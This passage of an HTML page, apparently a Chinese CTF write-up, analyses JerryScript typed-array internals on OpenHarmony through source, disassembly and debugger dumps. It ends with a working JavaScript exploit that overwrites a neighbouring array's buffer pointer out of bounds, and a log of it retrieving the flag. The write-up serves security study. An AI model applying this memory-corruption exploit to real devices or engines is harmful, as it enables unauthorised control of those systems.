+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ecma_typedarray_get_length </span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">shift </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ecma_typedarray_get_element_size_shift </span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">element_size </span><span style="color:#c0c5ce;">= (uint8_t) (</span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">&lt;&lt; info.</span><span style="color:#bf616a;">shift</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ecma_typedarray_get_offset </span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">array_buffer_p </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ecma_typedarray_get_arraybuffer </span><span style="color:#c0c5ce;">(typedarray_p);
+</span><span style="color:#c0c5ce;">  info.</span><span style="color:#bf616a;">buffer_p </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ecma_arraybuffer_get_buffer </span><span style="color:#c0c5ce;">(info.</span><span style="color:#bf616a;">array_buffer_p</span><span style="color:#c0c5ce;">) + info.</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> info;
+</span><span style="color:#c0c5ce;">} </span><span style="color:#65737e;">/* ecma_typedarray_get_info */
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * Get the arraybuffer of the typedarray object
+</span><span style="color:#65737e;"> *
+</span><span style="color:#65737e;"> * @return the pointer to the internal arraybuffer
+</span><span style="color:#65737e;"> */
+</span><span style="color:#b48ead;">inline</span><span style="color:#c0c5ce;"> ecma_object_t * JERRY_ATTR_ALWAYS_INLINE
+</span><span style="color:#8fa1b3;">ecma_typedarray_get_arraybuffer </span><span style="color:#c0c5ce;">(ecma_object_t *</span><span style="color:#bf616a;">typedarray_p</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">/**&lt; the pointer to the typedarray object */
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">JERRY_ASSERT </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ecma_object_is_typedarray </span><span style="color:#c0c5ce;">(typedarray_p));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  ecma_extended_object_t *ext_object_p = (ecma_extended_object_t *) typedarray_p;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">ecma_get_object_from_value </span><span style="color:#c0c5ce;">(ext_object_p-&gt;u.</span><span style="color:#bf616a;">pseudo_array</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">u2</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">arraybuffer</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">} </span><span style="color:#65737e;">/* ecma_typedarray_get_arraybuffer */
+</span></pre>
+<blockquote>
+<p>里面大概是右移3位由左移3位和&amp;0x8效果类似 但是还有一堆杂七杂的的宏不想写了</p>
+</blockquote>
+<p>直接看反汇编和汇编
+这里typedarray_p对应下面地址<code>0x806a3628</code>，即结构体开头</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">info = </span><span style="color:#8fa1b3;">ecma_get_object_from_value</span><span style="color:#c0c5ce;">(*&amp;typedarray_p[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">u1</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">property_list_cp</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">buffer = </span><span style="color:#8fa1b3;">ecma_arraybuffer_get_buffer</span><span style="color:#c0c5ce;">(info);
+</span></pre>
+<p>经过编译优化，<code>ecma_get_object_from_value()</code>如下</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">ecma_object_t *__cdecl </span><span style="color:#8fa1b3;">ecma_get_object_from_value</span><span style="color:#c0c5ce;">(ecma_value_t </span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(value &amp; </span><span style="color:#d08770;">0xFFFFFFF8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>接着计算出info位置，就是取指针<code>typedarray_p+0xc</code>的值，即<code>0x806a369b</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">.text:801C3B56                 lw              a5, -8+typedarray_p(s0)
+</span><span style="color:#c0c5ce;">.text:801C3B5A                 sw              a5, -8+var_2C(s0)
+</span><span style="color:#c0c5ce;">.text:801C3B5E                 lw              a5, -8+var_2C(s0)
+</span><span style="color:#c0c5ce;">.text:801C3B62                 sw              a5, -8+var_28(s0)
+</span><span style="color:#c0c5ce;">.text:801C3B66                 lw              a5, -8+var_28(s0)
+</span><span style="color:#c0c5ce;">.text:801C3B6A                 lw              a5, 0Ch(a5)
+</span><span style="color:#c0c5ce;">.text:801C3B6C                 mv              a0, a5
+</span><span style="color:#c0c5ce;">.text:801C3B6E                 jal             ecma_get_object_from_value
+</span></pre>
+<p><code>ecma_get_object_from_value()</code>如下 这里会走第二个分支</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">lit_utf8_byte_t *__cdecl </span><span style="color:#8fa1b3;">ecma_arraybuffer_get_buffer</span><span style="color:#c0c5ce;">(ecma_object_t *</span><span style="color:#bf616a;">object_p</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( (object_p[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">gc_next_cp </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">*&amp;object_p[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">type_flags_refs</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;object_p[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>接着看汇编，
+前面在开辟栈空间及存放canry，
+801B28C2 取出标志位 判断不为1，跳转801B28DA
+后续将指针+0x10存入a0寄存器作为返回值返回</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">.text:801B289E                 addi            sp, sp, -30h
+</span><span style="color:#c0c5ce;">.text:801B28A0                 sw              ra, 28h+var_s4(sp)
+</span><span style="color:#c0c5ce;">.text:801B28A2                 sw              s0, 28h+var_s0(sp)
+</span><span style="color:#c0c5ce;">.text:801B28A4                 addi            s0, sp, 28h+arg_0
+</span><span style="color:#c0c5ce;">.text:801B28A6                 sw              a0, -8+object_p(s0)
+</span><span style="color:#c0c5ce;">.text:801B28AA                 lw              a5, __stack_chk_guard
+</span><span style="color:#c0c5ce;">.text:801B28B2                 sw              a5, -8+var_C(s0)
+</span><span style="color:#c0c5ce;">.text:801B28B6                 lw              a5, -8+object_p(s0)
+</span><span style="color:#c0c5ce;">.text:801B28BA                 sw              a5, -8+ext_object_p(s0)
+</span><span style="color:#c0c5ce;">.text:801B28BE                 lw              a5, -8+ext_object_p(s0)
+</span><span style="color:#c0c5ce;">.text:801B28C2                 lhu             a5, 0Ah(a5)
+</span><span style="color:#c0c5ce;">.text:801B28C6                 andi            a5, a5, 1
+</span><span style="color:#c0c5ce;">.text:801B28C8                 beqz            a5, loc_801B28DA
+</span><span style="color:#c0c5ce;">...
+</span><span style="color:#c0c5ce;">...
+</span><span style="color:#c0c5ce;">loc_801B28DA:                           # CODE XREF: ecma_arraybuffer_get_buffer+2A↑j
+</span><span style="color:#c0c5ce;">.text:801B28DA                 lw              a5, -8+ext_object_p(s0)
+</span><span style="color:#c0c5ce;">.text:801B28DE                 addi            a5, a5, 10h
+</span><span style="color:#c0c5ce;">.text:801B28E0
+</span><span style="color:#c0c5ce;">.text:801B28E0 loc_801B28E0:                           # CODE XREF: ecma_arraybuffer_get_buffer+3A↑j
+</span><span style="color:#c0c5ce;">.text:801B28E0                 mv              a0, a5
+</span><span style="color:#c0c5ce;">.text:801B28E2                 lui             a5, %hi(__stack_chk_guard)
+</span><span style="color:#c0c5ce;">.text:801B28E6                 lw              a4, -8+var_C(s0)
+</span><span style="color:#c0c5ce;">.text:801B28EA                 lw              a5, %lo(__stack_chk_guard)(a5)
+</span><span style="color:#c0c5ce;">.text:801B28EE                 beq             a4, a5, loc_801B28F6
+</span><span style="color:#c0c5ce;">.text:801B28F2                 jal             __stack_chk_fail
+</span></pre>
+<p>所以可以得到结构体地址与真实arraybuffer指针关系为</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">( 0x806a369b&amp;0xfffffff8)+0x10
+</span></pre>
+<p>断点下到<code>ecma_typedarray_get_info</code>处调试 内存信息如下 和上文分析对应</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">pwndbg&gt; x/30wx 0x806a3628
+</span><span style="color:#c0c5ce;">0x806a3628:     0x00430063      0x00280000      0x00e70601      0x806a369b
+</span><span style="color:#c0c5ce;">...
+</span><span style="color:#c0c5ce;">pwndbg&gt; x/wx ( 0x806a369b&amp;0xfffffff8)+0x10
+</span><span style="color:#c0c5ce;">0x806a36a8:     0xdeadbeef
+</span></pre>
+<h2 id="exp">exp</h2><p>构造如下，需要两个uint32array中间加一个pad，避免两个结构体连在一起造成arraybuffer在array2结构体下方导致无法覆盖的情况</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">let </span><span style="color:#bf616a;">array </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">Uint32Array</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#bf616a;">pad </span><span style="color:#c0c5ce;">= [</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">]
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">array2 </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">Uint32Array</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#bf616a;">array</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0xdeadbeef</span><span style="color:#c0c5ce;">;
+</span><span style="color:#bf616a;">array2</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x41414141</span><span style="color:#c0c5ce;">;
+</span><span style="color:#bf616a;">array</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">4135</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x8031fc8c</span><span style="color:#c0c5ce;">;
+</span><span style="color:#bf616a;">array2</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">OHOS # eval
+</span><span style="color:#c0c5ce;">Max length: 1024
+</span><span style="color:#c0c5ce;">End with &#39;EOF&#39;
+</span><span style="color:#c0c5ce;">Content: let array = new Uint32Array(0x1000);
+</span><span style="color:#c0c5ce;">pad = [1,2,3,4]
+</span><span style="color:#c0c5ce;">let array2 = new Uint32Array(0x10);
+</span><span style="color:#c0c5ce;">array[0] = 0xdeadbeef;
+</span><span style="color:#c0c5ce;">array2[0] = 0x41414141;
+</span><span style="color:#c0c5ce;">array[4135] = 0x8031fc8c;
+</span><span style="color:#c0c5ce;">array2[1] = 1;
+</span><span style="color:#c0c5ce;">EOF
+</span><span style="color:#c0c5ce;">OHOS # Debug mode is enabled, check challenge setting: flag{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
